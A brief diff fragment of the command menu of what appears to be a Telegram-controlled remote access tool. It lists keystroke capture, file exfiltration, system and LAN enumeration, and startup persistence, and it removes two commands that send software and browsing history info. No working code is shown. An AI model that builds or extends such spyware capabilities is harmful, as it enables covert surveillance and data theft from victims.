@@ -70,8 +70,6 @@ Key-Capture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see 'Extra-Info' for more)
 Upload      : Uploads a specific file (use -path)
 System-Info   : Send System info as text file
-Software-Info   : Send Software info as text file
-History-Info   : Send History info as text file
 Enumerate-LAN   : Info for other devices on the LAN
 Add-Persistance   : Add Telegram C2 to Startup
 Remove-Persistance   : Remove Startup Persistance
